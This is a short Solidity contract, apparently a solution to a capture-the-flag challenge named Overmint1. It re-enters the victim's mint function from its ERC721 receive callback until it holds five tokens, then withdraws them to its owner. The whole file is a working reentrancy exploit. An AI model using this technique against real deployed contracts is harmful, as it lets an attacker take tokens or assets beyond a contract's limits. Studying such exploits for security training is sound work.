// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import {IERC721Receiver} from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import {Overmint1} from "./overmint1.sol";

contract Attack1 is IERC721Receiver {
    address private victim;
    address private owner;

    constructor(address _victim, address _owner) {
        victim = _victim;
        Overmint1(victim).mint();
        owner = _owner;
    }

    function onERC721Received(address, address, uint256, bytes calldata) public returns (bytes4) {
        if (Overmint1(victim).balanceOf(address(this)) < 5) {
            Overmint1(victim).mint();
        }
        return IERC721Receiver.onERC721Received.selector;
    }

    function withdraw(uint256 tokenId) external {
        Overmint1(victim).transferFrom(address(this), owner, tokenId);
    }
}
